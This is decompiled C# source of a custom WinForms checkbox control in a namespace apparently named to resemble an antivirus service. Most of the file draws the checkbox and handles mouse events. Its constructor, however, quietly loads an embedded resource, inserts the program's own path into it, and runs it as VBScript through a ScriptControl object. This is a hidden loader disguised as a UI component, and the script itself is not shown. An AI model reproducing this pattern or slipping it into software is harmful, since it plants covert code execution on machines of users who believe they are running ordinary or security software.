using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using ASCAvSvc.My.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ASCAvSvc;

[DefaultEvent("CheckedChanged")]
public class PerplexCheckBox : Control
{
	public delegate void CheckedChangedEventHandler(object sender);

	private MouseState State;

	private bool _Checked;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private CheckedChangedEventHandler CheckedChangedEvent;

	public bool Checked
	{
		get
		{
			return _Checked;
		}
		set
		{
			_Checked = value;
			((Control)this).Invalidate();
		}
	}

	public event CheckedChangedEventHandler CheckedChanged
	{
		[CompilerGenerated]
		add
		{
			CheckedChangedEventHandler checkedChangedEventHandler = CheckedChangedEvent;
			CheckedChangedEventHandler checkedChangedEventHandler2;
			do
			{
				checkedChangedEventHandler2 = checkedChangedEventHandler;
				CheckedChangedEventHandler value2 = (CheckedChangedEventHandler)Delegate.Combine(checkedChangedEventHandler2, value);
				checkedChangedEventHandler = Interlocked.CompareExchange(ref CheckedChangedEvent, value2, checkedChangedEventHandler2);
			}
			while ((object)checkedChangedEventHandler != checkedChangedEventHandler2);
		}
		[CompilerGenerated]
		remove
		{
			CheckedChangedEventHandler checkedChangedEventHandler = CheckedChangedEvent;
			CheckedChangedEventHandler checkedChangedEventHandler2;
			do
			{
				checkedChangedEventHandler2 = checkedChangedEventHandler;
				CheckedChangedEventHandler value2 = (CheckedChangedEventHandler)Delegate.Remove(checkedChangedEventHandler2, value);
				checkedChangedEventHandler = Interlocked.CompareExchange(ref CheckedChangedEvent, value2, checkedChangedEventHandler2);
			}
			while ((object)checkedChangedEventHandler != checkedChangedEventHandler2);
		}
	}

	protected override void OnMouseEnter(EventArgs e)
	{
		((Control)this).OnMouseEnter(e);
		State = MouseState.Over;
		((Control)this).Invalidate();
	}

	protected override void OnMouseDown(MouseEventArgs e)
	{
		((Control)this).OnMouseDown(e);
		State = MouseState.Down;
		((Control)this).Invalidate();
	}

	protected override void OnMouseLeave(EventArgs e)
	{
		((Control)this).OnMouseLeave(e);
		State = MouseState.None;
		((Control)this).Invalidate();
	}

	protected override void OnMouseUp(MouseEventArgs e)
	{
		((Control)this).OnMouseUp(e);
		State = MouseState.Over;
		((Control)this).Invalidate();
	}

	protected override void OnTextChanged(EventArgs e)
	{
		((Control)this).OnTextChanged(e);
		((Control)this).Invalidate();
	}

	protected override void OnResize(EventArgs e)
	{
		((Control)this).OnResize(e);
		((Control)this).set_Height(14);
	}

	protected override void OnClick(EventArgs e)
	{
		_Checked = !_Checked;
		CheckedChangedEvent?.Invoke(this);
		((Control)this).OnClick(e);
	}

	public PerplexCheckBox()
	{
		State = MouseState.None;
		int try000d_dispatch = -1;
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		object objectValue = default(object);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try000d_dispatch)
				{
				default:
					num = 1;
					((Control)this).SetStyle((ControlStyles)2050, true);
					goto IL_001c;
				case 333:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_000d;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_001c;
						case 3:
							goto IL_0029;
						case 4:
							goto IL_0036;
						case 5:
							goto IL_004a;
						case 6:
							goto IL_0053;
						case 7:
							goto IL_005b;
						case 8:
							goto IL_0063;
						case 9:
							goto IL_007e;
						case 10:
							goto IL_0096;
						case 11:
							goto end_IL_000d_2;
						default:
							goto end_IL_000d;
						case 12:
							goto end_IL_000d_3;
						}
						goto default;
					}
					IL_0096:
					num = 10;
					NewLateBinding.LateSet(objectValue, (Type)null, "language", new object[1] { "VBScript" }, (string[])null, (Type[])null);
					break;
					IL_007e:
					num = 9;
					objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("ScriptControl", ""));
					goto IL_0096;
					IL_001c:
					num = 2;
					((Control)this).set_BackColor(Color.Transparent);
					goto IL_0029;
					IL_0029:
					num = 3;
					((Control)this).set_ForeColor(Color.Black);
					goto IL_0036;
					IL_0036:
					num = 4;
					((Control)this).set_Size(new Size(145, 16));
					goto IL_004a;
					IL_004a:
					num = 5;
					((Control)this).set_DoubleBuffered(true);
					goto IL_0053;
					IL_0053:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_005b;
					IL_005b:
					num = 7;
					text = Resources.intdeails;
					goto IL_0063;
					IL_0063:
					num = 8;
					text = Strings.Replace(text, "%path%", Assembly.GetExecutingAssembly().Location, 1, -1, (CompareMethod)0);
					goto IL_007e;
					end_IL_000d_2:
					break;
				}
				num = 11;
				object[] array;
				bool[] array2;
				NewLateBinding.LateCall(objectValue, (Type)null, "AddCode", array = new object[1] { text }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
				if (array2[0])
				{
					text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
				}
				break;
				end_IL_000d:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try000d_dispatch = 333;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_000d_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	protected override void OnPaint(PaintEventArgs e)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Expected O, but got Unknown
		//IL_008d: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ae: Expected O, but got Unknown
		//IL_00b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bf: Expected O, but got Unknown
		//IL_00ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_00e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_0108: Unknown result type (might be due to invalid IL or missing references)
		//IL_010d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0114: Unknown result type (might be due to invalid IL or missing references)
		//IL_0120: Expected O, but got Unknown
		//IL_0138: Unknown result type (might be due to invalid IL or missing references)
		//IL_013d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0144: Unknown result type (might be due to invalid IL or missing references)
		//IL_0150: Expected O, but got Unknown
		//IL_0247: Unknown result type (might be due to invalid IL or missing references)
		//IL_024e: Expected O, but got Unknown
		//IL_025f: Unknown result type (might be due to invalid IL or missing references)
		Bitmap val = new Bitmap(((Control)this).get_Width(), ((Control)this).get_Height());
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		checked
		{
			Rectangle rectangle = new Rectangle(0, 0, ((Control)this).get_Height() - 1, ((Control)this).get_Height() - 1);
			val2.set_SmoothingMode((SmoothingMode)2);
			val2.set_CompositingQuality((CompositingQuality)2);
			val2.Clear(((Control)this).get_BackColor());
			LinearGradientBrush val3 = new LinearGradientBrush(rectangle, Color.FromArgb(174, 195, 30), Color.FromArgb(141, 153, 16), 90f);
			val2.FillRectangle((Brush)(object)val3, val3.get_Rectangle());
			val2.DrawRectangle(new Pen(Color.Gray), new Rectangle(1, 1, ((Control)this).get_Height() - 3, ((Control)this).get_Height() - 3));
			val2.DrawRectangle(new Pen(Color.Black), rectangle);
			Font val4 = new Font("Tahoma", 9f, (FontStyle)1);
			Brush val5 = (Brush)new SolidBrush(Color.FromArgb(205, 205, 205));
			string text = ((Control)this).get_Text();
			Brush black = Brushes.get_Black();
			PointF pointF = new Point(17, 9);
			StringFormat val6 = new StringFormat();
			val6.set_Alignment((StringAlignment)0);
			val6.set_LineAlignment((StringAlignment)1);
			val2.DrawString(text, val4, black, pointF, val6);
			string text2 = ((Control)this).get_Text();
			PointF pointF2 = new Point(16, 8);
			StringFormat val7 = new StringFormat();
			val7.set_Alignment((StringAlignment)0);
			val7.set_LineAlignment((StringAlignment)1);
			val2.DrawString(text2, val4, val5, pointF2, val7);
			if (Checked)
			{
				Rectangle rectangle2 = new Rectangle((int)Math.Round((double)rectangle.X + (double)rectangle.Width / 4.0), (int)Math.Round((double)rectangle.Y + (double)rectangle.Height / 4.0), unchecked(rectangle.Width / 2), unchecked(rectangle.Height / 2));
				Point[] array = new Point[3]
				{
					new Point(rectangle2.X, rectangle2.Y + unchecked(rectangle2.Height / 2)),
					new Point(rectangle2.X + unchecked(rectangle2.Width / 2), rectangle2.Y + rectangle2.Height),
					new Point(rectangle2.X + rectangle2.Width, rectangle2.Y)
				};
				val2.set_SmoothingMode((SmoothingMode)2);
				Pen val8 = new Pen(Color.FromArgb(12, 12, 12), 2f);
				new LinearGradientBrush(rectangle2, Color.White, Color.White, 0f);
				int num = array.Length - 2;
				for (int i = 0; i <= num; i++)
				{
					val2.DrawLine(val8, array[i], array[i + 1]);
				}
			}
			NewLateBinding.LateCall((object)e.get_Graphics(), (Type)null, "DrawImage", new object[3]
			{
				((Image)val).Clone(),
				0,
				0
			}, (string[])null, (Type[])null, (bool[])null, true);
			val2.Dispose();
			((Image)val).Dispose();
		}
	}
}
